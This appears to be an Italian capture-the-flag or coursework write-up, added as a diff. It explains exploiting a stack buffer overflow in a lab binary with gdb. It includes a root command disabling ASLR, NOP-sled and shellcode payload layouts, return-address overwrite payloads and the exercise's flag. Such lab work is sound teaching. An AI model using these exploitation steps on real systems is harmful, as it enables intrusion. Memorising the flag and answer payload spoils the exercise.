@@ -1,0 +1,85 @@
+#################################SHELLCODE########################################
+Per prima cosa, per evitare indirizzi casuali di memoria, si esegue da root:
+echo 0 > /proc/sys/kernel/randomize_va_space
+Lancio dell'eseguibile con gdb, trovo indirizzo strcpy usando info functions: 0x56556030.
+
+#Colloco a questo indirizzo un breakpoint per poter esaminare lo stack durante l'esecuzione.
+Con vari tentativi scopro che riesco a sovrascrivere l'inizio  dell'indirizzo di ritorno dando NNN caratteri.
+
+Per sovrascrivere l'indirizzo di ritorno completamente uso NNN+4 caratteri:
+run $(perl -e 'print "A"xNNN,"BBBB"')
+
+
+Nell'immagine overflow.png si vede come l'indirizzo di ritorno risulti sovrascritto dalle B(42) inserite come payload
+
+A questo punto compongo il payload nel seguente modo: SSS byte sono di shellcode, 4 di indirizzo di ritorno, i restanti di NOP (\x90). Il numero di byte totali da dare per sovrascrivere completamente l'indirizzo di ritorno è NNN byte, quindi il numero di NOP(\x90) da inserire è di NNN=(NNN-4-SSS) byte. 
+Payload:
+run $(perl -e 'print "\x90"xNNN,"SHELCODE_HERE,"BBBB"')
+
+L'indirizzo di ritorno lo scelgo controllando lo stack con x/700xw $esp, in particolare uso 0xffffd2b0 come indirizzo di ritorno perchè è molto probabile cadere nella zona dei NOP.
+Quando metto l'indirizzo di ritorno nel payload lo scrivo in little endian
+
+Nell'immagine final_shell.png si vede payload iniettato e shell eseguita come conseguenza del payload. L'immagine payload.png è uguale a questa perchè in entrambe si vedono sia payload che shell.
+(Consegnare le due immagini serve se per qualche motivo non funziona l'exploit, e si può dimostrare di aver composto correttamente il payload pur non avendo raggiunto la shell).
+
+
+
+
+
+
+
+
+#################################FLAG (SECRET_FUNCTIONS)########################################
+**FLAG:**
+SEC{simple_buffer_overflow_with_secret_7unction}
+
+**PAYLOAD FINALE**
+AAAAAAAAAAAAAAAA\x42\x64\x55\x56
+o
+AAAAAAAAAAAAAAAABdUV
+in forma testuale. (Contiene 16 A)
+
+**PASSAGGI:**
+
+- Per prima cosa, per evitare indirizzi casuali di memoria, si esegue da root:
+		echo 0 > /proc/sys/kernel/randomize_va_space
+		
+- Poi, si esegue dalla cartella contenente es
+		gdb es
+		
+- Esecuzione del programma con 
+		run Prova
+per verificare la funzionalità, e poter ottenere i veri indirizzi delle funzioni al passaggio successivo.
+
+- 'info functions' per controllare la presenza di funzioni segrete, ritrovando:
+		0x565561c9  secret_function_maybe
+		0x565562f2  secret_function_maybe_flag
+		0x56556442  secret_function_not
+		0x5655658f  secret_function_rr
+	
+Nota: eseguendo info functions prima dell'esecuzione, avremmo ottenuto indirizzi comincianti per 0000, non corrispondenti a quelli effettivi durante l'esecuzione.
+
+- Tentativi con 
+		run $(perl -e 'print "A"xN')
+dove N viene dimezzato ogni volta partendo da un numero alto, per trovare l'N più piccolo con cui avviene segfault e quindi overflow, e poi eventualmente aggiustato a mano per trovare N preciso: N = 16
+
+- Controllo con 
+		run $(perl -e 'print "A"xN,"BBBB"')
+per verificare che l'indirizzo visualizzato a schermo corrisponda alle 4 B (0x42424242), e combacia
+
+#ATTENZIONE MODIFICARE:
+- Tentativo di sostituzione dell'indirizzo di ritorno a 0x565562f2 (secret_function_maybe_flag) tramite
+		run $(python -c 'print("A"*16 + "\xf2\x62\x55\x56")')
+	viene stampato flag non corretto: "Sorry this is not the correct function"
+	
+- Controllo analogo di secret_function_maybe, secret_function_rr tramite
+		run $(python -c 'print("A"*16 + "\xc9\x61\x55\x56")')
+		run $(python -c 'print("A"*16 + "\x8f\x65\x55\x56")')
+	entrambi non validi o contententi link a video datati:
+		"Sorry this is not the correct function"
+		"https://www.youtube.com/watch?v=dQw4w9WgXcQ"
+		
+- Controllo di secret_function_not con
+		run $(python -c 'print("A"*16 + "\x42\x64\x55\x56")')
+viene stampato il flag:
+		SEC{simple_buffer_overflow_with_secret_7unction}
